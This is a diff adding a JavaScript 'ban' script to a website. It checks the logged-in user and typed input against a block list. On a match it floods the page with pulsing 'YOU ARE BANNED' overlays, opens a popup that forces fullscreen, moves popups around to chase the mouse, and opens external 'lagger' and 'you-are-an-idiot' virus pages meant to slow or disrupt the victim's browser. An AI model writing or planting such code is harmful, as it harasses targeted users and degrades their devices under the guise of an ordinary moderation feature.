@@ -1,0 +1,160 @@
+(function(){
+  var BLOCKED_EMAILS = ['weeee@outlook.com'];
+  var BLOCKED_USERNAMES = ['dick'];
+  var BLOCKED_DISPLAY_NAMES = ['dick'];
+
+  var BASE = 'https://jimmyqrg.github.io';
+  var LAGGER_URL = BASE + '/tools/lagger/index.html';
+  var VIRUS_URL = BASE + '/you-are-an-idiot/virus.html';
+  var _triggered = false;
+
+  function checkInputValue(val) {
+    if (_triggered) return;
+    var v = (val || '').trim().toLowerCase().replace(/^@/, '');
+    for (var i = 0; i < BLOCKED_EMAILS.length; i++) { if (v === BLOCKED_EMAILS[i]) { _triggered = true; runBan(); return; } }
+    for (var j = 0; j < BLOCKED_USERNAMES.length; j++) { if (v === BLOCKED_USERNAMES[j]) { _triggered = true; runBan(); return; } }
+    for (var k = 0; k < BLOCKED_DISPLAY_NAMES.length; k++) {
+      if (v === BLOCKED_DISPLAY_NAMES[k]) {
+        _triggered = true;
+        showDisplayNameWarning();
+        return;
+      }
+    }
+  }
+
+  function watchInputs() {
+    function attach(el) {
+      if (el._banWatched) return;
+      el._banWatched = true;
+      function handler() { checkInputValue(el.value); }
+      el.addEventListener('input', handler);
+      el.addEventListener('change', handler);
+    }
+    function scan(root) {
+      var inputs = (root || document).querySelectorAll('input[type="text"],input[type="email"],input:not([type]),textarea');
+      for (var i = 0; i < inputs.length; i++) attach(inputs[i]);
+    }
+    scan();
+    var obs = new MutationObserver(function() { scan(); });
+    obs.observe(document.body || document.documentElement, { childList: true, subtree: true });
+  }
+
+  function loadFont() {
+    if (document.getElementById('_ban_font')) return;
+    var l = document.createElement('link');
+    l.id = '_ban_font';
+    l.rel = 'stylesheet';
+    l.href = 'https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap';
+    document.head.appendChild(l);
+  }
+
+  function injectKeyframes() {
+    if (document.getElementById('_ban_kf')) return;
+    var s = document.createElement('style');
+    s.id = '_ban_kf';
+    s.textContent = '@keyframes _bpulse{0%{transform:scale(1) rotate(-1deg)}100%{transform:scale(1.04) rotate(1deg)}}';
+    document.head.appendChild(s);
+  }
+
+  function makeModal() {
+    var m = document.createElement('div');
+    m.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:'+(window._banZ=(window._banZ||9999900)+1)+';display:flex;align-items:center;justify-content:center;';
+    m.innerHTML = '<h1 style="font-family:\'Zilla Slab Highlight\',serif;font-size:12vw;color:#ff1a1a;text-shadow:0 0 80px rgba(255,0,0,.7),0 0 160px rgba(255,0,0,.4);animation:_bpulse .15s infinite alternate;text-align:center;">YOU ARE BANNED</h1>';
+    document.body.appendChild(m);
+  }
+
+  function showDisplayNameWarning() {
+    loadFont();
+    var overlay = document.createElement('div');
+    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:999990;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:40px;';
+    overlay.innerHTML = '<p style="font-family:\'Zilla Slab Highlight\',serif;font-size:2.5vw;color:#ff3333;text-align:center;max-width:800px;line-height:1.4;">This username had been used by a user that is permanently blocked from service, please use another display name next time.</p>';
+    document.body.appendChild(overlay);
+    setTimeout(runBan, 4000);
+  }
+
+  function runBan() {
+    loadFont();
+    injectKeyframes();
+    makeModal();
+    setInterval(makeModal, 400);
+    setTimeout(stage3, 2000);
+  }
+
+  function stage3() {
+    var popup = window.open('', '_blank', 'width=600,height=400');
+    if (!popup) return;
+    popup.document.write('<!DOCTYPE html><html><head><meta charset="utf-8"><link href="https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0}body{background:#000;overflow:hidden}.c{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column}h1{font-family:"Zilla Slab Highlight",serif;font-size:8vw;color:#ff1a1a;text-shadow:0 0 60px rgba(255,0,0,.7);animation:p .12s infinite alternate}@keyframes p{0%{transform:scale(1)}100%{transform:scale(1.03)}}button{margin-top:40px;padding:16px 48px;font-size:2vw;background:#ff1a1a;color:#fff;border:none;cursor:pointer;font-family:"Zilla Slab Highlight",serif;border-radius:8px}</style></head><body><div class="c"><h1>YOU ARE BANNED FROM SERVICE</h1><button id="cl">CLOSE</button></div><script>');
+    popup.document.write('function goFS(){try{document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen();}catch(e){}}');
+    popup.document.write('["click","keydown","mousedown","touchstart","pointerdown"].forEach(function(ev){document.addEventListener(ev,goFS,{once:false});});');
+    popup.document.write('document.getElementById("cl").addEventListener("click",function(e){e.stopPropagation();window.opener&&window.opener.postMessage("_ban_close_clicked","*");});');
+    popup.document.write('<\/script></body></html>');
+    popup.document.close();
+
+    window.addEventListener('message', function handler(ev) {
+      if (ev.data !== '_ban_close_clicked') return;
+      window.removeEventListener('message', handler);
+      stage4(popup);
+    });
+  }
+
+  function stage4(existingPopup) {
+    var laggerPopup = window.open(LAGGER_URL, '_blank', 'width=500,height=400');
+    var mouseX = screen.width / 2, mouseY = screen.height / 2;
+    document.addEventListener('mousemove', function(e) { mouseX = e.screenX; mouseY = e.screenY; });
+
+    setInterval(function() {
+      try { if (existingPopup && !existingPopup.closed) existingPopup.moveTo(mouseX - 200, mouseY - 150); } catch(e) {}
+    }, 30);
+
+    setInterval(function() {
+      try { if (laggerPopup && !laggerPopup.closed) laggerPopup.moveTo(Math.random() * (screen.width - 400), Math.random() * (screen.height - 300)); } catch(e) {}
+    }, 150);
+
+    var virusFired = false;
+    function fireVirus() {
+      if (virusFired) return;
+      virusFired = true;
+      window.open(VIRUS_URL, '_blank', 'width=600,height=400');
+    }
+    ['click','keydown','mousedown','touchstart','pointerdown','scroll'].forEach(function(ev) {
+      document.addEventListener(ev, fireVirus, { once: true, capture: true });
+    });
+  }
+
+  function checkUser() {
+    fetch('/api/auth/me', { credentials: 'same-origin' })
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        if (!d || !d.user) return;
+        var email = (d.user.email || '').toLowerCase();
+        var username = (d.user.username || '').toLowerCase();
+        var displayName = (d.user.display_name || '').toLowerCase();
+
+        for (var i = 0; i < BLOCKED_EMAILS.length; i++) {
+          if (email === BLOCKED_EMAILS[i]) { _triggered = true; runBan(); return; }
+        }
+        for (var j = 0; j < BLOCKED_USERNAMES.length; j++) {
+          if (username === BLOCKED_USERNAMES[j]) { _triggered = true; runBan(); return; }
+        }
+        for (var k = 0; k < BLOCKED_DISPLAY_NAMES.length; k++) {
+          if (displayName === BLOCKED_DISPLAY_NAMES[k]) {
+            _triggered = true;
+            showDisplayNameWarning();
+            return;
+          }
+        }
+      })
+      .catch(function() {});
+  }
+
+  function init() {
+    checkUser();
+    watchInputs();
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+})();
